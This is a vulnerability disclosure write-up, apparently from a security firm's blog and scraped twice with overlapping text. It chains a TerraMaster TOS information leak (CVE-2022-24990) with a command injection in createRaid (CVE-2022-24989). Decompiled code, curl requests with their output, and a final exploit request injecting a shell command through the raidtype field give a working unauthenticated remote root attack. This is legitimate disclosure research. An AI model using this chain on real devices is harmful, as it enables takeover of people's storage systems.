        } $dat = addslashes(json_encode($dataSheet));
        $tpl = "NOTIFY Message\\nIFC:$ifc\\nADDR:$addr\\nPWD:$pwd\\nSAT:$sat\\nDAT:$dat";
        $this->output("webNasIPS successful", true, $tpl);
    }
    $this->output("webNasIPS failed", false, "");
}
```

It returns the TOS firmware version, the default gateway interface’s IP and mac address, running services with their binding address and their ports, and a variable `$pwd` which contains the value of `$this->REQUESTCODE`. Upon checking the origins of `REQUESTCODE`, we see that it is set in `application.class.php`

The `_getpassword`functions essentially tells that REQUESTCODE is the hash of the admin password. This makes the above information leak a very dire one.

## Finding an OS command injection: CVE-2022-24989

If we remember earlier, one of the checks in `mobile.class.php` is:

```
if (!in_array(Action, self::$notHeader)) {
    if (!strstr($_SERVER['HTTP_USER_AGENT'], "TNAS") || !isset($_SERVER['HTTP_AUTHORIZATION']) || $this->REQUESTCODE != $_SERVER['HTTP_AUTHORIZATION']) {
        $this->output("Illegal request, please use genuine software!", false);
    }
}
```

Since  `webNasIPS` gives us REQUESTCODE without authentication, we can now call from the seven functions we listed which are in `NOT_LOGIN_CHECK`and in `$notCheck` array, but NOT in `$notHeader` arrary. `createRaid` is one of the functions which fullfills this.

```
function createRaid() {
    $vol = new volume();
    if (!isset($this->in['raidtype']) || !isset($this->in['diskstring'])){
        $this->output("Incomplete parameters", false);
    }
    $ret = $vol->volume_make_from_disks($this->in['raidtype'], $filesystem, $disks, $volume_size);
}
```

createRaid takes two POST parameters by `raidtype` and `diskstring` and calls `$vol->volume_make_from_disks` with the value of `raidtype` as the first parameter. Let’s have a closer look at `volume_make_from_disks` defined in `volume.class.php`.

```
function volume_make_from_disks($level, $fs, $disks, $volume_size) {
    $this->fun->_backexec("$_makemd -s{$volume_size} -l{$level} -b -t{$fs} {$diskItems} &");
}
```

It takes the first parameter and inserts it into a string to call another function `$this->fun->_backexec`. `_backexec` is a function defined in `func.class.php`.

```
function _backexec($command) {
     if (strstr($command, "regcloud")) {
          @system("killall -9 regcloud");
     }
     $fp = popen($command, "w");
     if ($fp == FALSE) return FALSE;
     pclose($fp);
     return TRUE;
}
```

`_backexec` function passes the parameters it receives to `popen` without any sanitization. Therefore, it’s vulnerable to OS command injection.

## Bypassing Timestamp header checks

We have now chained the information leak (admin password hash) with an OS injection vulnerability. But we have to return to `api.php` timestamp header check that we said we will look at later.

```
$instance = new $class();
if (!in_array($function, $class::$notHeader)) {
    #防止请求重放验证...
    if (tos_encrypt_str($_SERVER['HTTP_TIMESTAMP']) != $_SERVER['HTTP_SIGNATURE'] || $_SERVER['REQUEST_TIME'] - $_SERVER['HTTP_TIMESTAMP'] > 300) {
        $instance->output("Illegal request, timeout!", 0);
    }
}
$instance->$function();
```

api.php ensures that if the method name is not in the class’s `$notHeader` array, it will check that the TIMESTAMP header is not older than 300 seconds (5 minutes), and the SIGNATURE header has to be equal to the output of `tos_encrypt_str` function call on the TIMESTAMP value. Now, we have three problems.

* We have to get the time of the machine
* We have to know how `tos_encrypt_str` is invoked, and call it with arbitrary value
* We have to calculate the right TIMESTAMP in epoch time from the machine’s time regardless of time difference

Let’s start with tos\_encrypt\_str.

## Figuring out the custom hash function

Upon searching `tos_encrypt_str`, we realize that it’s not defined in the PHP scripts. And after a google search, we realize that it’s not also in the default and common list of php extentions. This leads us to the conclusion that it’s a function in one of TerraMaster’s custom PHP extenstions. Listing the loaded PHP extensions:

```
$ php -m
...
pgsql
Phar
php_terra_master
posix
redis
...
```

The extension `php_terra_master.so` sticks out. It exports one function, `tos_encrypt_str`.

```
$ php -r 'var_dump((new ReflectionExtension("php_terra_master"))->getFunctions());'
 array(1) {
    ["tos_encrypt_str"] => object(ReflectionFunction)
 #2 (1) {
    ["name"]=> string(15) "tos_encrypt_str"
}}
```

Calling `tos_encrypt_str` will tell us that it returns a hash.

```
$ php php -r 'echo tos_encrypt_str("XXXX") . PHP_EOL;'
6873abbd2da7dca265b78e64ead3729b
```

Opening the shared object in IDA, and searching for the string `tos_encrypt_str`, we find out that the hashing function is `sub_3738`.

```
result = zend_parse_parameters(v3, “s”, &v8, &v10);
if ( (_DWORD)result != -1 ) {
   v5 = (const char *)sub_3694(&v9);
   php_sprintf(v11, “%s%s”, v5, v8);
   v6 = (const char *)sub_2348(v11);
   v7 = zend_strpprintf(0LL, “%s”, v6);
```

It takes our string to be hashed from `zend_parse_parameters`, and passes it to `php_sprintf` (using variable `v8`). Before the php\_sprintf call, there is a function call `sub_3694`, whose return value is given to the php\_sprintf call as parameter, with our string. Let’s take a look at it.

```
__int64 __fastcall sub_3694(__int64 a1) {
    int v2;
    // w21 const char *v3;
    // x0 char v5[40];
    // [xsp+38h] [xbp+38h]
    BYREF v2 = socket(2, 1, 0);
    if ( (v2 & 0x80000000) != 0 ) {
        v3 = "socket";
        LABEL_5: perror(v3);
        return 0LL;
    }
    strcpy(v5, "eth0");
    if ( (ioctl(v2, 0x8927uLL, v5) & 0x80000000) != 0 ) {
        v3 = "ioctl";
        goto LABEL_5;
    }
    php_sprintf(a1, "%02x%02x%02x", (unsigned __int8)v5[21], (unsigned __int8)v5[22], (unsigned __int8)v5[23]);
    return a1;
}
```

This function gets the mac address of the interface `eth0` and returns the last 3 bytes (device specific part) in hex. Then the `php_sprintf` in sub\_3738 call formats it with our string to a final string to give it to `sub_2348`. Therefore, if the mac address of eth0 for a device is *55:44:33:12:34:56* and our string to be hashed is *XXXX*, then the final string given to the actuall hash function (sub\_2348) will be *123456XXXX*.

## Getting the later half of the mac

`tos_encrypt_str` using the later half of the mac address of eth0 allows each TerraMaster device to derive different hashes for the same string. This prevents us from calling the function with arbitrary stirng, since we need the mac address.

Lucky for us, `webNasIPS`, which leaks the admin password hash, also gives us the mac address of the default gateway interface, which is often eth0. Armed with the later half of the mac address, we can write a small hook to call tos\_encrypt\_str with any string value we want to generate the hash.

```
function webNasIPS() {
   $dataSheet[1] = array(
       "network" => $defaultgw,
       "ip" => $eth['ip'],
       "mask" => $eth['mask'],
       "mac" => $eth['mac'
   ]);
}
```
## Another information leak: time of the machine

Now that we can generate the right hash for any arbitrary string for any TerraMaster device, the only remaining piece is the timestamp value. On some TerraMaster TOS devices, there is a `Date` header that tells us what timezone the target machine is synched to, so we can sync our time with the victim and have an accurate timestamp. However, on TerraMaster devices, it is hardened and the `Date` header is stripped so it is not easy for us to figure out what timezone the machine is synched to.

Upon replaying with the request, we realize that sending a request to any of these functions in a way that the result is a failure will yield the time of the machine being leaked. Here is a simple request to call `createRaid` with no AUTHORIZATION, TIMESTAMP and SIGNATURE headers.

```
$ curl -k 'http://127.0.0.1:22056/module/api.php?mobile/createRaid' | jq -r
{
 "code": false,
 "msg": "Illegal request, please use genuine software!",
 "data": [],
 "time": 0.00028896331787109375,
 "ctime": "2022-01-10 23:00:38"
}
```

In the request, there is a value of `ctime`, which contains the date of the machine with the 24 hour format.

Now, with all the pieces on our hand, the only remaining task is to calculate the timestamp in epoch regardless of the machine’s timezone.

## Calculating the timestamp

To do this, we can use any unix [timestamp calculator](https://www.unixtimestamp.com/index.php). These are the steps to do that.

* We take the time of the machine from the `ctime` and convert it to epoch time
* We calculate our own time (both formal and epoch) (for example: using PHP’s `date` functionality: `php -r 'echo time() . " " . date("Y-m-d H:i:s") . PHP_EOL; '`)
* We subtract the epoch time of our machine from the target machine
* We convert the subtraction result of the above calculation into relative time
* We add/subtract the relative time to our machine’s formal time
* We convert the result from the above calculation to epoch time
* We now have the right epoch time. We calculate the hash of this epoch time using the machine’s later half of the mac
* We invoke `createRaid` with our payload in `raidtype`

## Exploitation

The final payload will look something like this.

```
$ curl -vk 'http://XXXX/module/api.php?mobile/createRaid' -H 'User-Agent: TNAS' -H 'AUTHORIZATION: $1$2kc1Zqe8$gi6hkBlDDDFHpG3RkZtws1' -d 'raidtype=;id>/tmp/a.txt;&amp;diskstring=XXXX' -H 'TIMESTAMP: 1642335373' -H 'SIGNATURE: 473a6d90ede9392eebd8a7995a0471fe' | jq -r
```

# Post navigation

[← CVE-2022-24948: Apache JSPWiki preauth Stored XSS to ATO](https://octagon.net/blog/2022/03/02/apache-jspwiki-preauth-xss-to-ato/) [Bypass CSP Using WordPress By Abusing Same Origin Method Execution →](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

SearchSearch
## Recent Posts

* [Juniper SSLVPN / JunOS RCE and Multiple Vulnerabilities](https://octagon.net/blog/2022/10/28/juniper-sslvpn-junos-rce-and-multiple-vulnerabilities/)
* [Bypass CSP Using WordPress By Abusing Same Origin Method Execution](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)
* [CVE-2022-24990: TerraMaster TOS unauthenticated remote command execution via PHP Object Instantiation](https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/)
* [CVE-2022-24948: Apache JSPWiki preauth Stored XSS to ATO](https://octagon.net/blog/2022/03/02/apache-jspwiki-preauth-xss-to-ato/)
* [MAMP Server preauth XSS leading to Host Compromise (0day)](https://octagon.net/blog/2022/01/26/mamp-server-preauth-xss-leading-to-host-compromise-0day/)
## Archives

* [October 2022](https://octagon.net/blog/2022/10/)
* [May 2022](https://octagon.net/blog/2022/05/)
* [March 2022](https://octagon.net/blog/2022/03/)
* [January 2022](https://octagon.net/blog/2022/01/)
## Categories

* [bug bounty, rce, preauth rce,](https://octagon.net/blog/category/bug-bounty-rce-preauth-rce/)
* [Uncategorized](https://octagon.net/blog/category/uncategorized/)

[![](/imgs/oct.png)](https://octagon.net)



=== Content from octagon.net_38390a79_20250108_133032.html ===


[![](/imgs/oct.png)](https://octagon.net/blog/)
Menu

* [About](https://www.octagon.net/about)
* [Contact Us](https://www.octagon.net/contact)

# CVE-2022-24990: TerraMaster TOS unauthenticated remote command execution via PHP Object Instantiation

March 7, 2022
  |  [No Comments](https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/#respond)

## Introduction

This report explains how researchers at Octagon Networks were able to chain two interesting vulnerabilities to achieve unauthenticated remote command execution as root on TerraMaster NAS devices running TOS version 4.2.29. Patches are distributed for 4.2.31 now.

## Analyzing the PHP files

After downloading the installation package of the latest TOS package from the official download site and extracting it using binwalk, we can see the platform uses nginx server with PHP scripts. The PHP scripts are encrypted on disk. After decrypting them and analyzing their content, there is an interesting php script – /usr/www/module/api.php.

The script starts parsing the uri components in the following manner.

```
$in = router();
$URI = $in['URLremote'];
if (!isset($URI[0]) || $URI[0] == '')
  $URI[0] = $default_controller;
if (!isset($URI[1]) || $URI[1] == '')
  $URI[1] = $default_action;

define('Module', $URI[0]);
define('Action', $URI[1]);
$class = Module;
$function = Action;
```

The `router` function parses the get parameters and assigns them in such a way that if the request is <http://target/module/api.php?XXXX/YYYY>, then `$class` will be XXXX, and `$function` is YYYY.

It then checks if the function is in an array of `NO_LOGIN_CHECK`, and if it’s not, it sets `REQUEST MODE` to 1. This will be important detail for the exploit later.

```
$GLOBALS['NO_LOGIN_CHECK'] = array(
      "webNasIPS",
      "getDiskList",
      "createRaid",
      "getInstallStat",
      "getIsConfigAdmin",
      "setAdminConfig",
      "isConnected"
);
if (!in_array($function, $GLOBALS['NO_LOGIN_CHECK'])) {
      define('REQUEST_MODE', 1);
} else {
      define('REQUEST_MODE', 0);
}
```

It then instantiates the class stated by `$class` and calls the method stated by `$function`.

```
$instance = new $class();
if (!in_array($function, $class::$notHeader)) {
 #防止请求重放验证...
 if (tos_encrypt_str($_SERVER['HTTP_TIMESTAMP']) != $_SERVER['HTTP_SIGNATURE'] || $_SERVER['REQUEST_TIME'] - $_SERVER['HTTP_TIMESTAMP'] > 300) {
   $instance->output("Illegal request, timeout!", 0);
 }
} $instance->$function();
```

One thing to notice here is that the line `if (!in_array($function, $class::$notHeader)) {`. If our function is not in an array by the name of `$notHeadeer`, then a check will be made. It takes the TIMESTAMP http header and passes it to a function called `tos_encrypt_str`, and compares the output of the function to the value in SIGNATURE http header. It then checks if the timestamp is not older than 5 minutes. The `tos_encrypt_str` is a custom hashing function, which we will come to analyze later to figure out how SIGNATURE is created.

Looking for php scripts which have classes which can be invoked this way, I came across `/usr/www/include/class/mobile.class.php`. To start off, it has two arrays of method name, `$notCheck` and `$notHeader`.

```
static $notCheck = [
        "webNasIPS", "getDiskList", "createRaid", "getInstallStat",
        "getIsConfigAdmin",  "setAdminConfig", "isConnected", 'createid',
        'user_create',  'user_bond', 'user_release', 'login',
        'logout', 'checkCode', "wapNasIPS"
];
//不验证头信息是否匹配...
static $notHeader = [
        "fileDownload", "videoPlay", "imagesThumb",
        "imagesView", "fileUpload", "tempClear",
        "wapNasIPS", "webNasIPS", "isConnected"
];
```

Then it makes three check in its constructor.

```
if (!in_array(Action, self::$notHeader)) {
    if (!strstr($_SERVER['HTTP_USER_AGENT'], "TNAS") || !isset($_SERVER['HTTP_AUTHORIZATION']) || $this->REQUESTCODE != $_SERVER['HTTP_AUTHORIZATION']) {
        $this->output("Illegal request, please use genuine software!", false);
    }
}
```

The first check ensures that if the method name invoked is not in `$notHeader` array, it tests whether the user-agent http header is ‘TNAS’ and AUTHORIZATION header is equal to `$this->REQUESTCODE`. Otherwise it exits with an error message. The AUTHORIZATION header will be important later on. For now, let’s proceed to the second check.

```
if (REQUEST_MODE) {
   if (!isset($_SESSION)) {
     $this->output("session write error!", false);
   } else {
     $this->user = &$_SESSION['kod_user'];
   }
   if (isset($this->in['PHPSESSID'])) {
     $this->sessionid = $this->in['PHPSESSID'];
   }
}
```

if `REQUEST_MODE` is set, then it checks whether the user is logged in. Otherwise it will exit. And the final check:

```
if (!in_array(Action, self::$notCheck)) {
     if (!$this->loginCheck()) {
          $this->output("login is timeout", 0);
     }
}
```

It checks whether the method name is in `$notCheck`, and exits with an error if it’s not.

## Severe Information Leak: CVE-2022-24990

So, with the knowledge of the two php script chains, we know that the seven functions “webNasIPS”, “getDiskList”, “createRaid”, “getInstallStat”, “getIsConfigAdmin”, “setAdminConfig”, “isConnected” are in `NO_LOGIN_CHECK` array in `api.php`, and will set `REQUEST_MODE` to 0, passing one of the checks in `mobile.class.php`. And upon further checking these functions, `webNasIPS` is the only function which is both in `$notCheck` and `$notHeader` arrays of `mobile.class.php`‘s constructor, which effectively can pass two remaining checks. Let’s call webNasIPS and see what it returns.

```
$ curl -vk 'http://XXXX/module/api.php?mobile/webNasIPS' -H 'User-Agent: TNAS' * Trying XXXX... * Connected to 127.0.0.1 (127.0.0.1) port 22056 (#0)
> GET /module/api.php?mobile/webNasIPS HTTP/1.1
> Host: 127.0.0.1:22056
> User-Agent: TNAS < HTTP/1.1 200 OK < Date: Mon, 10 Jan 2022 14:10:40 GMT < Content-Type: application/json; charset=utf-8 < Transfer-Encoding: chunked < Connection: keep-alive < X-Powered-By: TerraMaster * Connection #0 to host 127.0.0.1 left intact {"code":true,"msg":"webNasIPS successful","data":"NOTIFY Message\nIFC:10.0.2.2\nADDR:525400123456\nPWD:$1$2kc1Zqe8$gighkBlDDDFHpG3RkZtws1\nSAT:1\nDAT:[{\"hostname\":\"ubuntu1604-aarch64\",\"firmware\":\"TOS3_A1.0_4.2.17\",\"sn\":\"\",\"version\":\"2110301418\"},{\"network\":\"eth0\",\"ip\":\"10.0.2.15\",\"mask\":\"255.255.255.0\",\"mac\":\"52:54:00:12:34:56\"},{\"service\":[{\"name\":\"http_ssl\",\"url\":\"\",\"port\":\"5443\"},{\"name\":\"http\",\"url\":\"XXXX\",\"port\":\"8181\"},{\"name\":\"sys\",\"url\":\"XXXX\",\"port\":\"8181\"},{\"name\":\"channel\",\"url\":\"\",\"port\":0},{\"name\":\"pt\",\"url\":\"\",\"port\":0},{\"name\":\"ftp\",\"url\":\"\",\"port\":21},{\"name\":\"web_dav\",\"url\":\"\",\"port\":0},{\"name\":\"smb\",\"url\":\"\",\"port\":0}]}]","time":2.920037031173706}
```

It returns a lot of interesting data. Let’s look at the function webNasIPS

```
function webNasIPS() {
    if (strstr($_SERVER['HTTP_USER_AGENT'], "TNAS")) {
        $core = new core();
        $dataSheet[0] = [
            "hostname" => $core->_hostname(),
            "firmware" => $core->_version(),
            "sn" => $core->_system_product_name(),
            "version" => $core->_VersionNumber()
        ];
        $defaultgw = $core->_default_RJ45();
        $eth = $core->_netlist($defaultgw);
        $dataSheet[1] = array(
            "network" => $defaultgw,
            "ip" => $eth['ip'],
            "mask" => $eth['mask'],
            "mac" => $eth['mac']
        );
        $dataSheet[2] = array("service" => $this->_getservicelist());
        $ifc = $_SERVER['REMOTE_ADDR'];
        $addr = preg_replace("/[:\n\r]+/", "", file_get_contents("/sys/class/net/eth0/address"));
        $pwd = $this->REQUESTCODE;
        if (!file_exists("/tmp/databack/complete")) {
            $sat = -1;
        } else if (!empty($this->_exec("df-json | awk '/\/mnt\/md/'"))) {
            $sat = !file_exists(USER_SYSTEM . '/install.lock') ? 2 : 1;
        } else {
            $sat = 0;
        } $dat = addslashes(json_encode($dataSheet));
        $tpl = "NOTIFY Message\\nIFC:$ifc\\nADDR:$addr\\nPWD:$pwd\\nSAT:$sat\\nDAT:$dat";
        $this->output("webNasIPS successful", true, $tpl);
    }
    $this->output("webNasIPS failed", false, "");
}
```

It returns the TOS firmware version, the default gateway interface’s IP and mac address, running services with their binding address and their ports, and a variable `$pwd` which contains the value of `$this->REQUESTCODE`. Upon checking the origins of `REQUESTCODE`, we see that it is set in `application.class.php`

The `_getpassword`functions essentially tells that REQUESTCODE is the hash of the admin password. This makes the above information leak a very dire one.

## Finding an OS command injection: CVE-2022-24989

If we remember earlier, one of the checks in `mobile.class.php` is:

```
if (!in_array(Action, self::$notHeader)) {
    if (!strstr($_SERVER['HTTP_USER_AGENT'], "TNAS") || !isset($_SERVER['HTTP_AUTHORIZATION']) || $this->REQUESTCODE != $_SERVER['HTTP_AUTHORIZATION']) {
        $this->output("Illegal request, please use genuine software!", false);
    }
}
```

Since  `webNasIPS` gives us REQUESTCODE without authentication, we can now call from the seven functions we listed which are in `NOT_LOGIN_CHECK`and in `$notCheck` array, but NOT in `$notHeader` arrary. `createRaid` is one of the functions which fullfills this.

```
function createRaid() {
    $vol = new volume();
    if (!isset($this->in['raidtype']) || !isset($this->in['diskstring'])){
        $this->output("Incomplete parameters", false);
    }
    $ret = $vol->volume_make_from_disks($this->in['raidtype'], $filesystem, $disks, $volume_size);
}
```

createRaid takes two POST parameters by `raidtype` and `diskstring` and calls `$vol->volume_make_from_disks` with the value of `raidtype` as the first parameter. Let’s have a closer look at `volume_make_from_disks` defined in `volume.class.php`.

```
function volume_make_from_disks($level, $fs, $disks, $volume_size) {
    $this->fun->_backexec("$_makemd -s{$volume_size} -l{$level} -b -t{$fs} {$diskItems} &");
}
```

It takes the first parameter and inserts it into a string to call another function `$this->fun->_backexec`. `_backexec` is a function defined in `func.class.php`.

```
function _backexec($command) {
     if (strstr($command, "regcloud")) {
          @system("killall -9 regcloud");
     }
     $fp = popen($command, "w");
     if ($fp == FALSE) return FALSE;
     pclose($fp);
     return TRUE;
}
```

`_backexec` function passes the parameters it receives to `popen` without any sanitization. Therefore, it’s vulnerable to OS command injection.

## Bypassing Timestamp header checks

We have now chained the information leak (admin password hash) with an OS injection vulnerability. But we have to return to `api.php` timestamp header check that we said we will look at later.

```
$instance = new $class();
if (!in_array($function, $class::$notHeader)) {
    #防止请求重放验证...
    if (tos_encrypt_str($_SERVER['HTTP_TIMESTAMP']) != $_SERVER['HTTP_SIGNATURE'] || $_SERVER['REQUEST_TIME'] - $_SERVER['HTTP_TIMESTAMP'] > 300) {
        $instance->output("Illegal request, timeout!", 0);
    }
}
$instance->$function();
```

api.php ensures that if the method name is not in the class’s `$notHeader` array, it will check that the TIMESTAMP header is not older than 300 seconds (5 minutes), and the SIGNATURE header has to be equal to the output of `tos_encrypt_str` function call on the TIMESTAMP value. Now, we have three problems.

* We have to get the time of the machine
* We have to know how `tos_encrypt_str` is invoked, and call it with arbitrary value
* We have to calculate the right TIMESTAMP in epoch time from the machine’s time regardless of time difference

Let’s start with tos\_encrypt\_str.

## Figuring out the custom hash function

Upon searching `tos_encrypt_str`, we realize that it’s not defined in the PHP scripts. And after a google search, we realize that it’s not also in the default and common list of php extentions. This leads us to the conclusion that it’s a function in one of TerraMaster’s custom PHP extenstions. Listing the loaded PHP extensions:

```
$ php -m
...
pgsql
Phar
php_terra_master
posix
redis
...
```

The extension `php_terra_master.so` sticks out. It exports one function, `tos_encrypt_str`.

```
$ php -r 'var_dump((new ReflectionExtension("php_terra_master"))->getFunctions());'
 array(1) {
    ["tos_encrypt_str"] => object(ReflectionFunction)
 #2 (1) {
    ["name"]=> string(15) "tos_encrypt_str"
}}
```

Calling `tos_encrypt_str` will tell us that it returns a hash.

```
$ php php -r 'echo tos_encrypt_str("XXXX") . PHP_EOL;'
6873abbd2da7dca265b78e64ead3729b
```

Opening the shared object in IDA, and searching for the string `tos_encrypt_str`, we find out that the hashing function is `sub_3738`.

```
result = zend_parse_parameters(v3, “s”, &v8, &v10);
if ( (_DWORD)result != -1 ) {
   v5 = (const char *)sub_3694(&v9);
   php_sprintf(v11, “%s%s”, v5, v8);
   v6 = (const char *)sub_2348(v11);
   v7 = zend_strpprintf(0LL, “%s”, v6);
```

It takes our string to be hashed from `zend_parse_parameters`, and passes it to `php_sprintf` (using variable `v8`). Before the php\_sprintf call, there is a function call `sub_3694`, whose return value is given to the php\_sprintf call as parameter, with our string. Let’s take a look at it.

```
__int64 __fastcall sub_3694(__int64 a1) {
    int v2;
    // w21 const char *v3;
    // x0 char v5[40];
    // [xsp+38h] [xbp+38h]
    BYREF v2 = socket(2, 1, 0);
    if ( (v2 & 0x80000000) != 0 ) {
        v3 = "socket";
        LABEL_5: perror(v3);
        return 0LL;
    }
    strcpy(v5, "eth0");
    if ( (ioctl(v2, 0x8927uLL, v5) & 0x80000000) != 0 ) {
        v3 = "ioctl";
        goto LABEL_5;
    }
    php_sprintf(a1, "%02x%02x%02x", (unsigned __int8)v5[21], (unsigned __int8)v5[22], (unsigned __int8)v5[23]);
    return a1;
}
```

This function gets the mac address of the interface `eth0` and returns the last 3 bytes (device specific part) in hex. Then the `php_sprintf` in sub\_3738 call formats it with our string to a final string to give it to `sub_2348`. Therefore, if the mac address of eth0 for a device is *55:44:33:12:34:56* and our string to be hashed is *XXXX*, then the final string given to the actuall hash function (sub\_2348) will be *123456XXXX*.

## Getting the later half of the mac

`tos_encrypt_str` using the later half of the mac address of eth0 allows each TerraMaster device to derive different hashes for the same string. This prevents us from calling the function with arbitrary stirng, since we need the mac address.

Lucky for us, `webNasIPS`, which leaks the admin password hash, also gives us the mac address of the default gateway interface, which is often eth0. Armed with the later half of the mac address, we can write a small hook to call tos\_encrypt\_str with any string value we want to generate the hash.

```
function webNasIPS() {
   $dataSheet[1] = array(
       "network" => $defaultgw,
       "ip" => $eth['ip'],
       "mask" => $eth['mask'],
       "mac" => $eth['mac'
   ]);
}
```
## Another information leak: time of the machine

Now that we can generate the right hash for any arbitrary string for any TerraMaster device, the only remaining piece is the timestamp value. On some TerraMaster TOS devices, there is a `Date` header that tells us what timezone the target machine is synched to, so we can sync our time with the victim and have an accurate timestamp. However, on TerraMaster devices, it is hardened and the `Date` header is stripped so it is not easy for us to figure out what timezone the machine is synched to.

Upon replaying with the request, we realize that sending a request to any of these functions in a way that the result is a failure will yield the time of the machine being leaked. Here is a simple request to call `createRaid` with no AUTHORIZATION, TIMESTAMP and SIGNATURE headers.

```
$ curl -k 'http://127.0.0.1:22056/module/api.php?mobile/createRaid' | jq -r
{
 "code": false,
 "msg": "Illegal request, please use genuine software!",
 "data": [],
 "time": 0.00028896331787109375,
 "ctime": "2022-01-10 23:00:38"
}
```

In the request, there is a value of `ctime`, which contains the date of the machine with the 24 hour format.

Now, with all the pieces on our hand, the only remaining task is to calculate the timestamp in epoch regardless of the machine’s timezone.

## Calculating the timestamp

To do this, we can use any unix [timestamp calculator](https://www.unixtimestamp.com/index.php). These are the steps to do that.

* We take the time of the machine from the `ctime` and convert it to epoch time
* We calculate our own time (both formal and epoch) (for example: using PHP’s `date` functionality: `php -r 'echo time() . " " . date("Y-m-d H:i:s") . PHP_EOL; '`)
* We subtract the epoch time of our machine from the target machine
* We convert the subtraction result of the above calculation into relative time
* We add/subtract the relative time to our machine’s formal time
* We convert the result from the above calculation to epoch time
* We now have the right epoch time. We calculate the hash of this epoch time using the machine’s later half of the mac
* We invoke `createRaid` with our payload in `raidtype`

## Exploitation

The final payload will look something like this.

```
$ curl -vk 'http://XXXX/module/api.php?mobile/createRaid' -H 'User-Agent: TNAS' -H 'AUTHORIZATION: $1$2kc1Zqe8$gi6hkBlDDDFHpG3RkZtws1' -d 'raidtype=;id>/tmp/a.txt;&amp;diskstring=XXXX' -H 'TIMESTAMP: 1642335373' -H 'SIGNATURE: 473a6d90ede9392eebd8a7995a0471fe' | jq -r
```

# Post navigation

[← CVE-2022-24948: Apache JSPWiki preauth Stored XSS to ATO](https://octagon.net/blog/2022/03/02/apache-jspwiki-preauth-xss-to-ato/) [Bypass CSP Using WordPress By Abusing Same Origin Method Execution →](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

SearchSearch
## Recent Posts

* [Juniper SSLVPN / JunOS RCE and Multiple Vulnerabilities](https://octagon.net/blog/2022/10/28/juniper-sslvpn-junos-rce-and-multiple-vulnerabilities/)
* [Bypass CSP Using WordPress By Abusing Same Origin Method Execution](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)
* [CVE-2022-24990: TerraMaster TOS unauthenticated remote command execution via PHP Object Instantiation](https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/)
* [CVE-2022-24948: Apache JSPWiki preauth Stored XSS to ATO](https://octagon.net/blog/2022/03/02/apache-jspwiki-preauth-xss-to-ato/)
* [MAMP Server preauth XSS leading to Host Compromise (0day)](https://octagon.net/blog/2022/01/26/mamp-server-preauth-xss-leading-to-host-compromise-0day/)
## Archives

* [October 2022](https://octagon.net/blog/2022/10/)
* [May 2022](https://octagon.net/blog/2022/05/)
* [March 2022](https://octagon.net/blog/2022/03/)
* [January 2022](https://octagon.net/blog/2022/01/)
## Categories

* [bug bounty, rce, preauth rce,](https://octagon.net/blog/category/bug-bounty-rce-preauth-rce/)
* [Uncategorized](https://octagon.net/blog/category/uncategorized/)

[![](/imgs/oct.png)](https://octagon.net)


